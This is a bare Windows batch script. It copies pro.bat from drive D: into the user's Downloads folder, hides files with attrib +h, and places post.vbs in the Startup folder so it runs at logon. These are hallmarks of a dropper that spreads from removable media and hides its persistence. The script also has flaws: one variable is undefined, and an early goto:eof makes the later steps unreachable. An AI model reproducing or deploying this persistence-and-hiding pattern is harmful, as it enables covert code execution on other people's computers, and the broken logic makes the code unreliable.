@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
for /R "D:\" %%i in (pro.bat) do (
    copy "%%i" "%downloads_dir%"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)
attrib +h %downloads%/pro.bat
for /R "%downloads_dir%" %%i in (pro1.bat) do (
    copy "%%i" "%downloads_dir%"
    ping -n 1 127.0.0.1 > nul
    goto:eof
)
attrib +h %downloads_dir%/pro1.bat
for /R "%downloads_dir%" %%i in (post.vbs) do (
    copy "%%i" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
    ping -n 1 127.0.0.1 > nul 
    goto:eof
)

